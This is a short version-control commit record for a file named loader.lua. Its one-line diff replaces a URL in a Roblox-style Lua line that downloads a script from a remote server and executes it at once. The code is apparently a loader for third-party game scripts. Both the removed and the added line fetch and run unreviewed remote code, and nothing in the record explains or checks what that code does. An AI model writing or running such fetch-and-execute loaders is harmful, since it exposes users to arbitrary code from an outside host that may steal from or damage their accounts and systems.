6e664a01b238dd9202b97e0476061efd7c2d9b24
azurelw <yupio2acxount@gmail.com>
2025-12-13 23:56:34 +0500

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://verifiedguard.space.z.ai/api/script/k4A1IWdW1ypv"))()
+loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/ebdffb9ac953705b47da2649005fe72d07e80363a4dbf469bfbcf4680711c22a/download"))()
